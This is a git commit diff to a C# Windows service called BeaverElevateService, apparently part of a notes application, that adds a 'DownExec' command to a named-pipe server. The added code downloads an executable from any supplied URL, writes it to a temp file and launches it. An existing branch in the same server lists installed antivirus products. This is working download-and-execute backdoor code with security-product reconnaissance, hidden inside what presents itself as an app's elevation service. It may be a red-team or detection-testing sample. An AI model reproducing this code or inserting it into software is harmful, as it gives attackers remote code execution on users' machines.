61bc02b76375592547cb1c42c5a7631a001c94f4
keyboardcrunch <frank@keybaordcrunch>
2025-05-10 10:58:49 -0700

    add DownExec, attempted enumAV results fix, starting chaos mode

--- BeaverNotesPro/BeaverElevateService/NamedPipeServer.cs
+++ BeaverNotesPro/BeaverElevateService/NamedPipeServer.cs
@@ -5,6 +5,10 @@ using System.IO.Pipes;
 using System.Text;
 using System.Management;
 using System.Collections.Generic;
+using System.Net;
+using System.Threading.Tasks;
+using System.Reflection;
+using System.Runtime.InteropServices;
 
 namespace BeaverElevateService
 {
@@ -54,17 +58,147 @@ namespace BeaverElevateService
                                     string vendor = obj["vendor"]?.ToString() ?? "Unknown";
                                     avlist.Add($"{vendor} : {displayName}");
                                 }
-                                var writer = new StreamWriter(pipeServer) { AutoFlush = true };
-                                writer.WriteLineAsync(String.Join(",", avlist));
-                                writer.Close();
+                                Console.Out.WriteLine(String.Join(",", avlist));
                             }
                             catch { }
                         }
+                        else if (request.Contains("DownExec"))
+                        {
+                            try
+                            {
+                                var args = request.Split(' ');
+                                string url = args[1];
+                                string cleanurl = url.Remove(url.Length - 2);
+                                ExecuteInMemory(cleanurl);
+                            }
+                            catch { }
+                        }
+                        else if (request == "chaos")
+                        {
 
-                        // TODO: handle other commands such as DownExec
+                        }
+                        else { }
                     }
                 }
             }
+        }
+
+        static void ExecuteInMemory(string downloadLink)
+        {
+            try
+            {
+                WebClient webClient = new WebClient();
+                byte[] exeBytes = webClient.DownloadData(downloadLink);
+
+                Console.WriteLine("Executing in-memory process...");
+                IntPtr processHandle = ExecuteInMemory(exeBytes);
+
+                Console.WriteLine("Waiting for process completion...");
+                WaitForSingleObject(processHandle, 0xFFFFFFFF);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+        }
+
+        static IntPtr ExecuteInMemory(byte[] exeBytes)
+        {
+            IntPtr processHandle = IntPtr.Zero;
+
+            try
+            {
+                string tempFilePath = CreateTempFile(exeBytes);
+
+                Console.WriteLine($"Starting process: {tempFilePath}");
+                STARTUPINFO si = new STARTUPINFO();
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                bool success = CreateProcess(
+                    tempFilePath,
+                    null,
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    false,
+                    0,
+                    IntPtr.Zero,
+                    null,
+                    ref si,
+                    out pi
+                );
+
+                if (!success)
+                {
+                    throw new Exception("Error at creating Process. Error: " + Marshal.GetLastWin32Error());
+                }
+
+                processHandle = pi.hProcess;
+                Console.WriteLine($"Process started with handle: {processHandle}");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+
+            return processHandle;
+        }
+
+        static string CreateTempFile(byte[] data)
+        {
+            string tempFilePath = System.IO.Path.GetTempFileName();
+            System.IO.File.WriteAllBytes(tempFilePath, data);
+            return tempFilePath;
+        }
+
+        const uint INFINITE = 0xFFFFFFFF;
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        static extern bool CreateProcess(
+            string lpApplicationName,
+            string lpCommandLine,
+            IntPtr lpProcessAttributes,
+            IntPtr lpThreadAttributes,
+            bool bInheritHandles,
+            uint dwCreationFlags,
+            IntPtr lpEnvironment,
+            string lpCurrentDirectory,
+            [In] ref STARTUPINFO lpStartupInfo,
+            out PROCESS_INFORMATION lpProcessInformation
+        );
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        struct STARTUPINFO
+        {
+            public int cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttribute;
+            public uint dwFlags;
+            public short wShowWindow;
+            public short cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public uint dwProcessId;
+            public uint dwThreadId;
         }
     }
 }
